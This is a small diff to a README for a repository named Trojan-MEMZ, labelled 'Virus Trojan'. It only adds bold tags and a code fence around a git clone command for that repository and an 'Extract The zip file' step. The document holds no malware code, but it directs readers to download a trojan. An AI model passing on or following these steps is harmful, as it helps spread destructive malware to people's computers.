@@ -1,8 +1,9 @@
 # Trojan-MEMZ
-Virus Trojan
+<b>Virus Trojan<\b>
 
+```
 git clone https://github.com/ShahrokhParazit/Trojan-MEMZ
 
+```
 
-
-Extract The zip file
+<b> Extract The zip file <\b>
